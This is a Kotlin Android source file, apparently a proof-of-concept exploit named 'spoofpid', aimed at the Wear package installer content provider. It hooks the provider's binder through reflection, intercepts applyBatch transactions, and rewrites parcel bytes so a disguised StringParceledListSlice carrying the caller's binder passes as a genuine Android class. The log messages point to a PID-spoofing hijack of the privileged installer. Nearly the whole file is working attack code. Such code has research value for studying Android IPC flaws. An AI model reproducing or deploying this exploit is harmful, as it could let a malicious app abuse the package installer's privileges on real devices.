package jp.pulm.spoofpid

import android.content.ContentProviderOperation
import android.content.IContentProvider
import android.net.Uri
import android.os.Binder
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.IBinder
import android.os.Parcel
import android.util.Log
import diordna.content.pm.StringParceledListSlice
import kotlinx.coroutines.*
import org.jetbrains.anko.button
import org.jetbrains.anko.sdk27.coroutines.onClick
import org.jetbrains.anko.verticalLayout
import kotlin.system.exitProcess

/*
1. how to fix creator name
2. will IBinder as? Binder work
*/
class HijackingActivity : AppCompatActivity() {
    companion object {
        private const val authority = "com.google.android.packageinstaller.wear.provider"
        const val uri = "content://$authority"
        const val HijackingKey = "HijackingKey"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        installResolver()
        verticalLayout {
            button("Apply Batch For PackageInstaller") {
                onClick {
                    val binder = intent.getIBinderExtra(MainActivity.BinderKey)
                    val slice =
                        StringParceledListSlice("a b c d e f g".split(" "), binder as Binder)
                    slice.setInlineCountLimit(2)

                    (GlobalScope + CoroutineExceptionHandler { _, _ -> }).launch(Dispatchers.IO) {
                        // will be hijacked by the install action
                        contentResolver.applyBatch(
                            authority, arrayListOf(
                                ContentProviderOperation.newDelete(
                                    Uri.parse(uri)
                                ).withExtra(HijackingKey, slice)
                                    .build()
                            )
                        )
                    }

                    Log.e("natsuki", "commit applyBatch operation to package installer")

                    // ensure `applyBatch` already committed
                    delay(1000L)
                    Log.e(
                        "natsuki",
                        "hijacker will quit this game with pid: ${android.os.Process.myPid()}"
                    )
//                    exitProcess(0)
                }
            }
        }
    }

    private fun installResolver() {
        val proxy = contentResolver.acquireProvider(authority)
        val field = proxy.javaClass.getDeclaredField("mRemote")
        field.isAccessible = true
        val src = field.get(proxy) as IBinder
        val changed = installRemote(src)
        field.set(proxy, changed)
    }


    private fun installRemote(remote: IBinder): IBinder {
        return object : IBinder by remote {
            override fun transact(
                code: Int,
                data: Parcel,
                reply: Parcel,
                flags: Int
            ): Boolean {
                return if (code == IContentProvider.APPLY_BATCH_TRANSACTION) {
                    remote.transact(code, fixCreatorName(data), reply, flags)
                } else {
                    remote.transact(code, data, reply, flags)
                }
            }
        }
    }

    fun fixCreatorName(src: Parcel): Parcel {
        val fixedBytes = src.marshall().foldIndexed(byteArrayOf()) { idx, acc, ele ->
            // find "diordna"
            if (ele == 'a'.toByte() && idx >= 6 && acc.copyOfRange(idx - 6, idx + 1)
                    .toList() == "diordna".toByteArray().toList()
            ) {
                Log.e("natsuki", "found @@@")
                acc[idx - 6] = 'a'.toByte()
                acc[idx - 5] = 'n'.toByte()
                acc[idx - 4] = 'd'.toByte()
                acc[idx - 3] = 'r'.toByte()
                acc[idx - 2] = 'o'.toByte()
                acc[idx - 1] = 'i'.toByte()
                acc[idx] = 'd'.toByte()
            }
            acc
        }
        val fixed = Parcel.obtain()
        fixed.unmarshall(fixedBytes, 0, fixedBytes.size)
        return fixed
    }

}